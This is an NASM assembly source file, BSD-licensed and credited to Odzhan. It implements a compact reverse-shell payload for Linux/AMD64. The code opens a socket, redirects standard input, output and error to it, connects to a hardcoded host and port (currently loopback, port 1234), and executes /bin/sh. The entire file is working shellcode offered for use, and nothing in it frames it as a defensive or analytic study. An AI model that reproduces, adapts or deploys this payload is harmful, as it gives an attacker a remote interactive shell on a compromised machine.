;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    

; 65 byte reverse shell for Linux/AMD64
; odzhan

    %define AMD64
    %include "include.inc"
    
    %ifndef BIN
      global start
      global _start
    %endif
    
    %define HOST 0x0100007f
    %define PORT 1234
    
start:
_start:
    ; step 1, create a socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    SYS_socket 
    pop     rax    
    push    SOCK_STREAM
    pop     rsi
    push    AF_INET
    pop     rdi
    cdq                      ; IPPROTO_IP
    syscall
    
    xchg    eax, edi         ; edi = s, eax = 2
    xchg    eax, esi         ; esi = 2, eax = 1
    
    ; step 2, assign socket handle to stdin,stdout,stderr
    ; dup2 (s, STDIN_FILENO)
    ; dup2 (s, STDOUT_FILENO)
    ; dup2 (s, STDERR_FILENO)
c_dup:
    mov     al, SYS_dup2
    syscall
    dec     esi 
    jns     c_dup       ; jump if not signed
    
    ; step 3, connect to remote host
    ; connect (s, &sa, sizeof(sa));
    mov     rcx, ((HOST << 32) | ((htons(PORT) << 16) | AF_INET) & 0xFFFFFFFF)
    push    rcx
    push    rsp    
    pop     rsi              ; rsi = &sa
    mov     dl, 16           ; rdx = sizeof(sa)
    mov     al, SYS_connect
    syscall    
    
    ; step 4, execute /bin/sh
    ; execv("/bin//sh", 0, 0);
    cdq
    push    rdx
    pop     rsi              ; rsi=0
    push    rdx              ; zero terminator
    mov     rcx, '/bin//sh'
    push    rcx
    push    rsp
    pop     rdi    
    mov     al, SYS_execve
    syscall
    
